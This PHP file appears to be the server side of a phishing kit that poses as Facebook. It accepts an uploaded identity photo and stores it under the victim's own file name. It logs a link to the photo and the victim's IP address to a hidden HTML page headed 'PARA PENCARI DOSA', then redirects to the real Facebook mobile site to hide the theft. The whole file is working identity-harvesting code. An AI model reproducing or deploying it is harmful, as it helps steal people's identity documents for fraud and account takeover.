<?php 

if(isset($_POST['submit'])) {
    $ip    = $_SERVER['REMOTE_ADDR'];
    $namaFile = $_FILES['fileToUpload']['name'];
    $namaSementara = $_FILES['fileToUpload']['tmp_name'];
    $fileNameCmps = explode(".", $namaFile);
    $fileExtension = strtolower(end($fileNameCmps));
    $dirUpload = "img/";

    $allowedfileExtensions = array('jpg', 'gif', 'png', 'PNG', 'zip', 'txt', 'xls', 'doc');
    if (in_array($fileExtension, $allowedfileExtensions)) {
        $terupload = move_uploaded_file($namaSementara, $dirUpload.$namaFile);
        if ($terupload) {
            $file = "bosmudaOKEYYYYYYYYYYYYYYY.html";
            
            $handle = fopen($file, 'a');
            fwrite($handle, "======================================PARA PENCARI DOSA======================================");
            fwrite($handle, "<br>");
            fwrite($handle, "Identity Foto");
            fwrite($handle, "<br>");
            fwrite($handle, "<br>");
            fwrite($handle, "<a href='img/".$namaFile."'>Lihat Foto</a>");
            fwrite($handle, "$email");
            fwrite($handle, "<br>");
            fwrite($handle, "IP Address : ");
            fwrite($handle, "$ip");
            fwrite($handle, "<br>");
            fwrite($handle, "======================================PARA PENCARI DOSA======================================");
            fwrite($handle, "<br>");
            fwrite($handle, "<br>");
            fclose($handle);

            header('location: https://m.facebook.com/?_rdr');
        }
    }
} else {
    echo "DIE";
}

?>
